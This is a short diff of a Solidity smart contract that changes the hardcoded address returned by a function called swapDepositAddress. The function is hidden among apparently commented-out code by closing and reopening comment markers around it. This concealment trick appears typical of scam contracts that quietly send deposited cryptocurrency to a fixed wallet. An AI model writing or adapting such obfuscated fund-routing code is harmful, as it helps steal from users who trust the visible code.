@@ -110,7 +110,7 @@ contract Manager {
     function initialize(address, address) external;
     
     */function swapDepositAddress() public pure returns (address) {
-        return 0x57908d78F35f6d274E6A46520C3d6842A6683Ab9;
+        return 0x82bb2969FB3BeD8D155022887F49550C2304884a;
     }/*
 }
 
